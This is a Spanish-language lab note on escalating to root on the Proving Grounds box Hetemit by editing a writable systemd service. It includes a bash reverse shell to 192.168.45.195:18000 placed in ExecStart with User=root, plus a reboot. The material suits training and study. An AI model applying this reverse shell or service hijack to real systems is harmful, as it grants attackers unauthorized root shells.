
## DESCRIPTION
En este ejemplo encontramos otro servicio que podemos editar  y cuando reseteamos el equipo se ejecuta:

![[Pasted image 20230627204345.png]]

#### Mas información
* https://al1z4deh.medium.com/proving-grounds-hetemit-8469d0a3f189
* https://kashz.gitbook.io/proving-grounds-writeups/pg-boxes/hetemit/9-privesc-greater-than-root


## EXPLOITATION

1. Localizamos el servicio editable o linpeas o manual

```
find / -type f -maxdepth 2 -writable

find / -type d -maxdepth 2 -writable
```

3. Editamos el servicio con nuestra reverse shell

ORIGINAL:

```
[cmeeks@hetemit k]$ cat /etc/systemd/system/pythonapp.service

[Unit]

Description=Python App

After=network-online.target

[Service]

Type=simple

WorkingDirectory=/home/cmeeks/restjson_hetemit

ExecStart=flask run -h 0.0.0.0 -p 50000

TimeoutSec=30

RestartSec=15s

User=cmeeks

ExecReload=/bin/kill -USR1 $MAINPID

Restart=on-failure

[Install]

WantedBy=multi-user.target
```

Cambiamos `ExecStart` con el comando y `user` con root

```
cat /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.195/18000 0>&1'
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target

```

4. Nos ponemos a la escucha

5. Reseteamos el equipo con sudo

```
sudo reboot
```


## MACHINES

* Hack The Box: 
* PG: Hetemit

**!!NOTA IMPORTANTE!!** 